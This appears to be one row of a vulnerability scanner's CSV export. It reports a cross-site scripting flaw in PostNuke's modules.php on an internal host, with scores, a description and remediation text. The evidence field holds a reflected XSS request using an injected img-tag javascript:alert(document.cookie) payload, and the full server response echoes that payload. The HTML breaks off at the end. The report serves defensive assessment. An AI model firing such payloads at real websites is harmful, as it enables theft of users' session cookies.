10.10.10.100,Global Default Network,,SYS_10_10_10_100,,,IP,Red Hat Linux 7.3,"host scanned, found vuln",11280,PostNuke Modules.PHP Multiple Cross-Site Scripting Vulnerabilities,New,Vuln,3,80,tcp,,,12/7/2018 12:09,12/7/2018 12:09,1,,,,,,,7898,5.6,4.3 (AV:N/AC:M/Au:N/C:N/I:P/A:N),3.9 (E:POC/RL:U/RC:C),"Asset Group: Prasad-Report-Ag2, Collateral Damage Potential:  High, Target Distribution: Medium, Confidentiality Requirement: Low, Integrity Requirement: High, Availability Requirement: Medium",,,,"PostNuke is a Web-based portal system that is implemented in PHP. PostNuke is available for a range of systems, including Unix, Linux, and Microsoft Windows.
 
The PostNuke ""modules.php"" script does not sufficiently sanitize data supplied via URI parameters, making it prone to cross-site scripting attacks. This vulnerability has been reported to affect PostNuke Version 0.7.2.3. Other versions may also be affected.
 
In particular, the ""categories"" and ""letter"" URI parameters are not properly sanitized of HTML tags. This vulnerability may allow for execution of hostile HTML and script code in the Web client of an unsuspecting user. When the user visits a Web page containing the malicious code, the attacker-supplied code is executed in the security context of the site hosting the software.",Exploitation of this vulnerability may allow for theft of cookie-based authentication credentials. Other attacks are also possible.,There are no vendor-supplied solutions available at this time. Check PostNuke's Web site (http://www.postnuke.com/) for updates.,,,"GET /postnuke/modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&op=modload&name=Members_List&file=index HTTP/1.1
Host: 10.10.10.100
Connection: Keep-Alive



HTTP/1.1 200 OK
Date: Wed, 18 Feb 2009 01:28:52 GMT
Server: Apache/1.3.27 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.12 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26
Set-Cookie: Apache=10.40.1.34.292121234920532760; path=/
X-Powered-By: PHP/4.1.2
Set-Cookie: POSTNUKESID=d74e70d81f6a522660a2137f2fadcd9d; expires=Wed, 25-Feb-09 01:28:56 GMT; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: cache
Pragma: no-cache
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Your Site Name :: Your slogan here</title>
<meta name=""KEYWORDS"" content=""nuke, postnuke, postnuke, free, community, php, portal, opensource, open source, gpl, mysql, sql, database, web site, website, weblog, content management, contentmanagement, web content management, webcontentmanagement"" />
<meta name=""DESCRIPTION"" content=""Your slogan here"" />
<meta name=""ROBOTS"" content=""INDEX,FOLLOW"" />
<meta name=""resource-type"" content=""document"" />
<meta http-equiv=""expires"" content=""0"" />
<meta name=""author"" content=""Your Site Name"" />
<meta name=""copyright"" content=""Copyright (c) 2001 by Your Site Name"" />
<meta name=""revisit-after"" content=""1 days"" />
<meta name=""distribution"" content=""Global"" />
<meta name=""generator"" content=""PostNuke 0.7.2.3-Phoenix - http://postnuke.com"" />
<meta name=""rating"" content=""General"" />
<link rel=""StyleSheet"" href=""themes/PostNuke/style/styleNN.css"" type=""text/css"" />
<style type=""text/css"">@import url(""themes/PostNuke/style/style.css""); </style>
<script type=""text/javascript"" src=""javascript/showimages.php""></script>

<script type=""text/javascript"" src=""javascript/openwindow.php?hlpfile=""></script>

</head>
<body>
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"" align=""center"">
<tr>
<td valign=""top"">
<table border=""0"" cellspacing=""0"" cellpadding=""0"" bgcolor=""#F6F7EB"" width=""100%"">
<tr>
<td align=""left"" valign=""middle"">
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""4"">
<tr>
<td class=""pn-title"" valign=""top"" align=""left"">
Your Site Name (index.php)<br />
<font class=""pn-logo-small"">Your slogan here</font></td>
<td width=""50%"" valign=""top"" align=""right"">
<br /><font class=""pn-logo-small"">Feb 17, 2009 - 05:28 PM</font></td>
</tr>
</table>
</td>
</tr>
<tr>
<td width=""100%"" bgcolor=""#000000""><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td bgcolor=""#E1E4CE"" align=""center"" valign=""middle"">
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""2"">
<tr>
<td align=""right"" valign=""middle"" class=""pn-normal"">
<span class=""pn-sub"">Submit News (modules.php?op=modload&name=Submit_News&file=index)&nbsp;::&nbsp;FAQ (modules.php?op=modload&name=FAQ&file=index)&nbsp;::&nbsp;Advanced Search (modules.php?op=modload&name=Search&file=index)&nbsp;::&nbsp;Reviews (modules.php?op=modload&name=Reviews&file=index)&nbsp;</span></td>
</tr>
</table>
</td>
</tr>
<tr>
<td width=""100%"" bgcolor=""#000000""><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td>
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""2"" bgcolor=""#B1B78B"">
<tr>
<td width=""100%"" align=""right"" valign=""middle"">
<form action=""modules.php"" method=""post"">
<input type=""hidden"" name=""name"" value=""Search"" />
<input type=""hidden"" name=""file"" value=""index"" />
<input type=""hidden"" name=""op"" value=""modload"" />
<input type=""hidden"" name=""action"" value=""search"" />
<input type=""hidden"" name=""overview"" value=""1"" />
<input type=""hidden"" name=""active_stories"" value=""1"" />
<input type=""hidden"" name=""bool"" value=""AND"" />
<input type=""hidden"" name=""stories_cat"" value="""" />
<input type=""hidden"" name=""stories_topics"" value="""" />
<font class=""pn-normal"">Search&nbsp;
<input class=""pn-text"" name=""q"" type=""text"" value="""" />&nbsp;
</font></form></td>
</tr>
</table>
</td>
</tr>
<tr>
<td width=""100%"" bgcolor=""#000000""><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
</table>
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tr>
<td width=""150"" bgcolor=""#D9DCC2""><img src=""themes/PostNuke/images/pix-t.gif"" width=""150"" height=""5"" alt="""" border=""0""></td>
<td width=""5""><img src=""themes/PostNuke/images/pix-t.gif"" width=""5"" height=""1"" alt="""" border=""0""></td>
<td width=""100%""><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td width=""150"" bgcolor=""#D9DCC2"" align=""center"" valign=""top"">
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tr bgcolor=""#000000"">
<td><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td align=""center"" valign=""top"">
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""4"">
<tr>
<td class=""pn-title"">Reminder</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor=""#000000"">
<td><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td align=""left"" valign=""top"" class=""pn-normal"">Please remember to remove the following files from your PostNuke directory
 
&middot; install.php  file
 
&middot; install  directory
 
If you do not remove these files then users can obtain the password to your database!</td>
</tr>
</table><br />
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tr bgcolor=""#000000"">
<td><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td align=""center"" valign=""top"">
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""4"">
<tr>
<td class=""pn-title"">Main Menu</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor=""#000000"">
<td><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td align=""left"" valign=""top"" class=""pn-normal""><strong><big>&middot;</big></strong>&nbsp;Home (index.php)<br /><br /> Modules <br /><strong><big>&middot;</big></strong>&nbsp;AvantGo (modules.php?op=modload&amp;name=AvantGo&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Downloads (modules.php?op=modload&amp;name=Downloads&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;FAQ (modules.php?op=modload&amp;name=FAQ&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Members List (modules.php?op=modload&amp;name=Members_List&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;News (modules.php?op=modload&amp;name=News&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Recommend Us (modules.php?op=modload&amp;name=Recommend_Us&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Reviews (modules.php?op=modload&amp;name=Reviews&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Search (modules.php?op=modload&amp;name=Search&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Sections (modules.php?op=modload&amp;name=Sections&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Stats (modules.php?op=modload&amp;name=Stats&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Topics (modules.php?op=modload&amp;name=Topics&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Top List (modules.php?op=modload&amp;name=Top_List&amp;file=index)<br /><strong><big>&middot;</big></strong>&nbsp;Web Links (modules.php?op=modload&amp;name=Web_Links&amp;file=index)<br /></td>
</tr>
</table><br />
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tr bgcolor=""#000000"">
<td><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td align=""center"" valign=""top"">
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""4"">
<tr>
<td class=""pn-title"">Who's Online</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor=""#000000"">
<td><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td align=""left"" valign=""top"" class=""pn-normal""><span class=""pn-normal"">We have 1 guest and 0 members online<br />
<br />You are an anonymous user. You can register for free by clicking here (user.php)</span><br /></td>
</tr>
</table><br />
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">
<tr bgcolor=""#000000"">
<td><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td align=""center"" valign=""top"">
<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""4"">
<tr>
<td class=""pn-title"">Languages</td>
</tr>
</table>
</td>
</tr>
<tr bgcolor=""#000000"">
<td><img src=""themes/PostNuke/images/pix-t.gif"" width=""1"" height=""1"" alt="""" border=""0""></td>
</tr>
<tr>
<td align=""left"" valign=""top"" class=""pn-normal""><center><font class=""pn-normal"">Select interface language:</font>  <form method=""post"" action=""index.php""><select class=""pn-text"" name=""newlanguage"" onChange=""top.location.href=this.options[this.selectedIndex].value""><option value=""index.php?newlang=eng"" selected>English</option>
</select></form></center></td>
</tr>
</table><br />
</td>
<td width=""5""><img src=""themes/PostNuke/images/pix-t.gif"" width=""5"" height=""1"" alt="""" border=""0""></td>
<td align=""center"" valign=""top"">


<!-- MEMBERS LIST -->

All (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=All&amp;sortby=uname)&nbsp;|&nbsp;
A (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=A&amp;sortby=uname)&nbsp;|&nbsp;
B (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=B&amp;sortby=uname)&nbsp;|&nbsp;
C (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=C&amp;sortby=uname)&nbsp;|&nbsp;
D (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=D&amp;sortby=uname)&nbsp;|&nbsp;
E (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=E&amp;sortby=uname)&nbsp;|&nbsp;
F (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=F&amp;sortby=uname)&nbsp;|&nbsp;
G (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=G&amp;sortby=uname)&nbsp;|&nbsp;
H (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=H&amp;sortby=uname)&nbsp;|&nbsp;
I (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=I&amp;sortby=uname)&nbsp;|&nbsp;
J (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=J&amp;sortby=uname)&nbsp;|&nbsp;
K (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=K&amp;sortby=uname)&nbsp;|&nbsp;
L (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=L&amp;sortby=uname)&nbsp;|&nbsp;
M (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=M&amp;sortby=uname)&nbsp;|&nbsp;
N (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=N&amp;sortby=uname) ]
 
[ O (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=O&amp;sortby=uname)&nbsp;|&nbsp;
P (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=P&amp;sortby=uname)&nbsp;|&nbsp;
Q (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=Q&amp;sortby=uname)&nbsp;|&nbsp;
R (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=R&amp;sortby=uname)&nbsp;|&nbsp;
S (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=S&amp;sortby=uname)&nbsp;|&nbsp;
T (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=T&amp;sortby=uname)&nbsp;|&nbsp;
U (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=U&amp;sortby=uname)&nbsp;|&nbsp;
V (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=V&amp;sortby=uname)&nbsp;|&nbsp;
W (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=W&amp;sortby=uname)&nbsp;|&nbsp;
X (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=X&amp;sortby=uname)&nbsp;|&nbsp;
Y (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=Y&amp;sortby=uname)&nbsp;|&nbsp;
Z (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=Z&amp;sortby=uname)&nbsp;|&nbsp;
Other / Unknown (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=Other / Unknown&amp;sortby=uname) ]
</center>
 

<form method=""POST"" action=""modules.php"">
<table border=""0"" cellspacing=""2"" width=""100%"">
<tr>
<td valign=""top"" align=center>
 Search:  <input type=""text"" name=""letter"" size=""35""> 
<input type=""hidden"" name=""op"" value=""modload"">
<input type=""hidden"" name=""name"" value=""Members_List"">
<input type=""hidden"" name=""file"" value=""index"">
<input type=""radio"" name=""sorting"" value=""uname"" checked>nickname
<input type=""radio"" name=""sorting"" value=""name"">real name
<input type=""radio"" name=""sorting"" value=""url"">url
    <input type=""submit"" value=""Submit""></td>
</tr>
</table>
</form> <table width=""95%"" align=""center""><tr><td align=right>|Last 10 registered users (#last)| Current members online (#online) |</td></tr></table><table width=""95%"" border=""0"" cellpadding=""3"" cellspacing=""1"" bgcolor=#000000 align=center><tr bgcolor=""#B1B78B"">
<td width=""10""  align=""center""><center><font class=""pn-normal"">Status</font></center></td><td align=""center"" ><center><font class=""pn-normal""  >Avatar</font></center></td>
<td  align=""center""><font class=""pn-normal"" > nickname </font></td>
<td  align=""center""><img src=javascript:alert(document.cookie);>&amp;sortby=name"">real name (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=\)</td>
<td  align=""center""><img src=javascript:alert(document.cookie);>&amp;sortby=femail"">PM (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=\)</td>
<td  align=""center""><img src=javascript:alert(document.cookie);>&amp;sortby=url"">url (modules.php?op=modload&amp;name=Members_List&amp;file=index&amp;letter=\)</td>
</tr><tr><td bgcolor=""#D9DCC2"" colspan=""8"" align=""center""> 
<font class=""pn-normal""> No members found for - \&quot;&gt;&lt;img src=javascript:alert(document.cookie);&gt; - </font>
  </td></tr>

<tr><td colspan=""9"" bgcolor=""#B1B78B""><center>We ha#",yes,,,CGI,No
